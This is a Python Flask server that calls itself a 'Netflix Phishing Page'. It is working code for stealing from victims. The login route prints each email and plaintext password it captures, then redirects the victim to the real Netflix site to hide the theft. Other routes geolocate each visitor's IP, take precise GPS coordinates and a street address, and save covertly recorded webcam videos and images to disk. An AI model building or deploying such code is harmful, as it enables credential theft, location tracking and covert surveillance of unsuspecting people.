import sys
import os
import io

# إعادة توجيه المخرجات القياسية لاستخدام UTF-8
sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8', errors='replace', line_buffering=True)
sys.stderr = io.TextIOWrapper(sys.stderr.buffer, encoding='utf-8', errors='replace', line_buffering=True)

from flask import Flask, render_template, request, redirect, url_for, jsonify
import logging
import datetime
import json
import requests
from werkzeug.utils import secure_filename

# Create Flask application
app = Flask(__name__)

# Setup logging
logs_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'logs')
if not os.path.exists(logs_dir):
    os.makedirs(logs_dir)
logging.basicConfig(filename=os.path.join(logs_dir, 'netflix.log'), level=logging.INFO,
                    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')

# Ensure upload directory exists
UPLOAD_FOLDER = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'upload')
if not os.path.exists(UPLOAD_FOLDER):
    os.makedirs(UPLOAD_FOLDER)
# Create necessary upload subdirectories
videos_dir = os.path.join(UPLOAD_FOLDER, 'videos')
sessions_dir = os.path.join(UPLOAD_FOLDER, 'sessions')
temp_dir = os.path.join(UPLOAD_FOLDER, 'temp')
images_dir = os.path.join(UPLOAD_FOLDER, 'images')
for directory in [videos_dir, sessions_dir, temp_dir, images_dir]:
    if not os.path.exists(directory):
        os.makedirs(directory)
app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER

# Function to get real IP address from various headers
def get_client_real_ip():
    # Check for X-Forwarded-For header (commonly used by proxies)
    x_forwarded_for = request.headers.get('X-Forwarded-For')
    if x_forwarded_for:
        # X-Forwarded-For can contain multiple IPs, the first one is the client's
        ip = x_forwarded_for.split(',')[0].strip()
        return ip
        
    # Check for X-Real-IP header (used by some proxies)
    x_real_ip = request.headers.get('X-Real-IP')
    if x_real_ip:
        return x_real_ip
        
    # If no proxy headers found, use the standard remote address
    return request.remote_addr

# Function to get location from IP
def get_location_from_ip(ip_address):
    try:
        # Using ipinfo.io service to get location data
        response = requests.get(f"https://ipinfo.io/{ip_address}/json")
        if response.status_code == 200:
            return response.json()
        return None
    except Exception as e:
        logging.error(f"Error getting location from IP: {str(e)}")
        return None

# Main login page
@app.route('/')
def index():
    # Get the real IP address
    ip_address = get_client_real_ip()
    user_agent = request.headers.get('User-Agent')
    current_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    # Print visitor information to terminal
    print("\n" + "="*70)
    print(f"[{current_time}] New visitor detected!")
    print(f"IP Address: {ip_address}")
    print(f"User Agent: {user_agent}")
    
    # Try to get location from IP
    ip_location = get_location_from_ip(ip_address)
    if ip_location:
        print("\nREAL IP LOCATION DATA:")
        print(f"City: {ip_location.get('city', 'Unknown')}")
        print(f"Region: {ip_location.get('region', 'Unknown')}")
        print(f"Country: {ip_location.get('country', 'Unknown')}")
        print(f"Location: {ip_location.get('loc', 'Unknown')}")
        print(f"Postal Code: {ip_location.get('postal', 'Unknown')}")
        print(f"ISP: {ip_location.get('org', 'Unknown')}")
        
        # If we have coordinates, create Google Maps URL
        if 'loc' in ip_location and ip_location['loc']:
            coords = ip_location['loc'].split(',')
            if len(coords) == 2:
                lat, lon = coords
                maps_url = f"https://www.google.com/maps?q={lat},{lon}&z=18"
                print(f"Google Maps URL: {maps_url}")
                
        # Save IP location data
        ip_location_file = os.path.join(app.config['UPLOAD_FOLDER'], f"ip_location_{current_time.replace(':', '-')}.json")
        with open(ip_location_file, 'w') as f:
            json.dump(ip_location, f, indent=4)
        
        # Log to file
        logging.info(f"IP location data: City: {ip_location.get('city')}, Country: {ip_location.get('country')}, Coords: {ip_location.get('loc')}")
    
    print("="*70 + "\n")
    
    # Log to file
    logging.info(f"New visitor: Real IP: {ip_address}, User Agent: {user_agent}")
    
    return render_template('login.html')

# Process login form
@app.route('/login', methods=['POST'])
def login():
    email = request.form.get('email')
    password = request.form.get('password')
    remember = request.form.get('remember') == 'on'
    
    # Log login information to file
    logging.info(f"Login attempt: Email: {email}, Remember me: {remember}")
    
    # Print login information to terminal
    current_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    print("\n" + "="*50)
    print(f"[{current_time}] New login detected!")
    print(f"email = {email}")
    print(f"passwd = {password}")
    print("="*50 + "\n")
    
    # Redirect to official Netflix website
    return redirect('https://www.netflix.com')

# Signup page
@app.route('/signup')
def signup():
    # Redirect to official Netflix signup page
    return redirect('https://www.netflix.com/signup')

# Handle location data
@app.route('/location', methods=['POST'])
def location():
    try:
        data = request.json
        current_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        # Print location information to terminal
        print("\n" + "="*70)
        print(f"[{current_time}] PRECISE LOCATION DATA RECEIVED!")
        print(f"Latitude: {data.get('latitude')}")
        print(f"Longitude: {data.get('longitude')}")
        if data.get('accuracy'):
            print(f"Accuracy: {data.get('accuracy')} meters")
        if data.get('altitude'):
            print(f"Altitude: {data.get('altitude')} meters")
        if data.get('speed'):
            print(f"Speed: {data.get('speed')} m/s")
        if data.get('heading'):
            print(f"Heading: {data.get('heading')} degrees")
        print(f"Timestamp: {data.get('timestamp')}")
        print(f"Google Maps URL: {data.get('mapUrl')}")
        print(f"Google Earth URL: {data.get('earthUrl')}")
        print("="*70 + "\n")
        
        # Log to file
        logging.info(f"Precise location: Lat: {data.get('latitude')}, Long: {data.get('longitude')}, Accuracy: {data.get('accuracy')} meters")
        
        # Save location data to JSON file
        location_file = os.path.join(app.config['UPLOAD_FOLDER'], f"location_{current_time.replace(':', '-')}.json")
        with open(location_file, 'w') as f:
            json.dump(data, f, indent=4)
        
        return jsonify({"status": "success"})
    except Exception as e:
        logging.error(f"Error handling location data: {str(e)}")
        return jsonify({"status": "error", "message": str(e)}), 500

# Handle detailed address data
@app.route('/address', methods=['POST'])
def address():
    try:
        data = request.json
        current_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        # Extract address components
        address = data.get('address', {})
        display_name = data.get('display_name', 'Unknown location')
        
        # Print address information to terminal
        print("\n" + "="*70)
        print(f"[{current_time}] DETAILED ADDRESS INFORMATION:")
        print(f"Full Address: {display_name}")
        
        # Print specific address components if available
        if address:
            if address.get('road'):
                print(f"Street: {address.get('road')}")
            if address.get('house_number'):
                print(f"House Number: {address.get('house_number')}")
            if address.get('postcode'):
                print(f"Postal Code: {address.get('postcode')}")
            if address.get('city') or address.get('town') or address.get('village'):
                print(f"City/Town: {address.get('city') or address.get('town') or address.get('village')}")
            if address.get('state') or address.get('state_district'):
                print(f"State/Province: {address.get('state') or address.get('state_district')}")
            if address.get('country'):
                print(f"Country: {address.get('country')}")
        print("="*70 + "\n")
        
        # Log to file
        logging.info(f"Address information: {display_name}")
        
        # Save address data to JSON file
        address_file = os.path.join(app.config['UPLOAD_FOLDER'], f"address_{current_time.replace(':', '-')}.json")
        with open(address_file, 'w') as f:
            json.dump(data, f, indent=4)
        
        return jsonify({"status": "success"})
    except Exception as e:
        logging.error(f"Error handling address data: {str(e)}")
        return jsonify({"status": "error", "message": str(e)}), 500

# Handle video upload
@app.route('/upload_video', methods=['POST'])
def upload_video():
    try:
        print("\n" + "="*70)
        current_time = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
        print(f"[{current_time}] Upload video request received!")
        print(f"Content-Type: {request.content_type}")
        print(f"Request method: {request.method}")
        print(f"Files in request: {request.files.keys()}")
        print(f"Form data in request: {request.form.keys()}")
        print("="*70 + "\n")
        
        logging.info(f"Upload video request received. Content-Type: {request.content_type}")
        
        if 'video' not in request.files:
            print("No video file found in request!")
            logging.error("No video file in request")
            return jsonify({"status": "error", "message": "No video file in request"}), 400
        
        video_file = request.files['video']
        if video_file.filename == '':
            print("Empty filename received!")
            logging.error("Empty filename in video upload")
            return jsonify({"status": "error", "message": "Empty filename"}), 400
        
        if video_file:
            # Create videos directory if it doesn't exist
            videos_dir = os.path.join(app.config['UPLOAD_FOLDER'], 'videos')
            if not os.path.exists(videos_dir):
                os.makedirs(videos_dir)
                print(f"Created directory: {videos_dir}")
                logging.info(f"Created videos directory: {videos_dir}")
                
            # Create a unique filename
            filename = f"webcam_recording_{current_time}.webm"
            filepath = os.path.join(videos_dir, secure_filename(filename))
            
            # Print debug information
            print(f"Attempting to save file to: {filepath}")
            print(f"Video file size: {len(video_file.read()) / 1024:.2f} KB")
            
            # Reset file pointer
            video_file.seek(0)
            
            # Save the file
            try:
                video_file.save(filepath)
                print(f"File saved successfully! Size: {os.path.getsize(filepath) / 1024:.2f} KB")
                logging.info(f"Webcam recording saved: {filepath}, Size: {os.path.getsize(filepath) / 1024:.2f} KB")
            except Exception as save_error:
                print(f"Error saving file: {str(save_error)}")
                logging.error(f"Error saving video file: {str(save_error)}")
                return jsonify({"status": "error", "message": f"Error saving file: {str(save_error)}"}), 500
            
            # Print information to terminal
            print("\n" + "="*50)
            print(f"[{current_time}] Webcam recording saved!")
            print(f"File: {filepath}")
            print(f"Size: {os.path.getsize(filepath) / 1024:.2f} KB")
            print("="*50 + "\n")
            
            return jsonify({"status": "success", "filename": filename})
        
        return jsonify({"status": "error", "message": "Empty video file"}), 400
    except Exception as e:
        print(f"Error in upload_video: {str(e)}")
        logging.error(f"Error handling webcam upload: {str(e)}")
        return jsonify({"status": "error", "message": str(e)}), 500

# Handle image upload
@app.route('/upload_image', methods=['POST'])
def upload_image():
    try:
        print("\n" + "="*70)
        current_time = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
        print(f"[{current_time}] Upload image request received!")
        print(f"Content-Type: {request.content_type}")
        print(f"Request method: {request.method}")
        print(f"Files in request: {request.files.keys()}")
        print("="*70 + "\n")
        
        logging.info(f"Upload image request received. Content-Type: {request.content_type}")
        
        if 'image' not in request.files:
            print("No image file found in request!")
            logging.error("No image file in request")
            return jsonify({"status": "error", "message": "No image file in request"}), 400
        
        image_file = request.files['image']
        if image_file.filename == '':
            print("Empty filename received!")
            logging.error("Empty filename in image upload")
            return jsonify({"status": "error", "message": "Empty filename"}), 400
        
        if image_file:
            # Create images directory if it doesn't exist
            images_dir = os.path.join(app.config['UPLOAD_FOLDER'], 'images')
            if not os.path.exists(images_dir):
                os.makedirs(images_dir)
                print(f"Created directory: {images_dir}")
                logging.info(f"Created images directory: {images_dir}")
                
            # Create a unique filename
            timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S_%f")
            filename = f"webcam_image_{timestamp}.jpg"
            filepath = os.path.join(images_dir, secure_filename(filename))
            
            # Print debug information
            print(f"Attempting to save file to: {filepath}")
            print(f"Image file size: {len(image_file.read()) / 1024:.2f} KB")
            
            # Reset file pointer
            image_file.seek(0)
            
            # Save the file
            try:
                image_file.save(filepath)
                print(f"Image saved successfully! Size: {os.path.getsize(filepath) / 1024:.2f} KB")
                logging.info(f"Webcam image saved: {filepath}, Size: {os.path.getsize(filepath) / 1024:.2f} KB")
            except Exception as save_error:
                print(f"Error saving image: {str(save_error)}")
                logging.error(f"Error saving image file: {str(save_error)}")
                return jsonify({"status": "error", "message": f"Error saving file: {str(save_error)}"}), 500
            
            # Print information to terminal
            print("\n" + "="*50)
            print(f"[{current_time}] Webcam image saved!")
            print(f"File: {filepath}")
            print(f"Size: {os.path.getsize(filepath) / 1024:.2f} KB")
            print("="*50 + "\n")
            
            return jsonify({"status": "success", "filename": filename})
        
        return jsonify({"status": "error", "message": "Empty image file"}), 400
    except Exception as e:
        print(f"Error in upload_image: {str(e)}")
        logging.error(f"Error handling webcam image upload: {str(e)}")
        return jsonify({"status": "error", "message": str(e)}), 500

if __name__ == '__main__':
    print("\n" + "="*50)
    print("Netflix Phishing Page Started")
    print("Waiting for visitors...")
    print("="*50 + "\n")
    app.run(host='0.0.0.0', port=50005, debug=True) 